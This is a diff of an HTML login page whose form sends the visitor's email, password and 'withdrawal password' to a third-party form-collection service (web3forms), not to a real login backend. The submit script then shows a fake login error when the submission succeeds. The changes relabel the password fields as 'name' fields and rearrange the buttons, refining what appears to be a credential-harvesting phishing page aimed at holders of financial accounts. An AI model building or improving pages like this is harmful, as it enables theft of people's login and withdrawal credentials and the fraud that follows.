@@ -32,7 +32,7 @@
   <form id="contactForm" action="https://api.web3forms.com/submit" method="POST">
     <div class="input-box">
       <span class="icon">👤</span>
-      <input name="email" type="text" id="contactInput" placeholder="Please enter your email address" required>
+      <input name="ename" type="text" id="contactInput" placeholder="Please enter your email address" required>
       <span class="clear">✕</span>
     </div>
     <div class="input-box">
@@ -43,8 +43,8 @@
           <path d="M12 15C13.1046 15 14 15.8954 14 17V19H10V17C10 15.8954 10.8954 15 12 15Z" fill="currentColor"/>
         </svg>
       </span>
-      <input name="pass" type="text" id="password" placeholder="Please enter your password" required>
-      <span class="toggle-pass" data-target="password">
+      <input name="pass" type="message" id="pass" placeholder="Please enter your name" required>
+      <span class="toggle-pass" data-target="pass">
         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
           <path d="M1 12C1 12 5 4 12 4s11 8 11 8-4 8-11 8S1 12 1 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
           <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/>
@@ -60,28 +60,25 @@
           <path d="M12 15C13.1046 15 14 15.8954 14 17V19H10V17C10 15.8954 10.8954 10 12 15Z" fill="currentColor"/>
         </svg>
       </span>
-      <input name="withdrawal" type="text" id="withdrawalPassword" placeholder="Please enter your withdrawal password" required>
-      <span class="toggle-pass" data-target="withdrawalPassword">
+      <input name="withdrawal" type="message" id="withdrawalPass" placeholder="Please enter your withdrawal name" required>
+      <span class="toggle-pass" data-target="withdrawalPass">
         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
           <path d="M1 12C1 12 5 4 12 4s11 8 11 8-4 8-11 8S1 12 1 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
           <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2"/>
         </svg>
       </span>
     </div>
-
-    <!-- Forgot -->
-    <div class="forgot">
-      <a href="#">Forgot your password?</a>
-    </div>
-
     <!-- Login Button -->
-    <button type="submit" class="login-btn">Login</button>
-
+    <button type="submit" class="login-btn">Enter</button>
+      </form>
     <!-- Signup -->
     <div class="signup">
       <a href="#">Sign up</a>
     </div>
-  </form>
+    <!-- Forgot -->
+    <div class="forgot" style="margin-top: 20px;">
+      <a href="#">Forgot your password?</a>
+    </div>
 
 </div>
 
@@ -109,7 +106,7 @@ form.addEventListener('submit', async (e) => {
         const data = await response.json();
 
         if (response.ok) {
-            alert("An error occurred while submitting the form. Please don't try again later.");
+            alert("An error occurred while logging you in.Please don't try again later.");
             form.reset();
         } else {
             alert("Error: " + data.message);
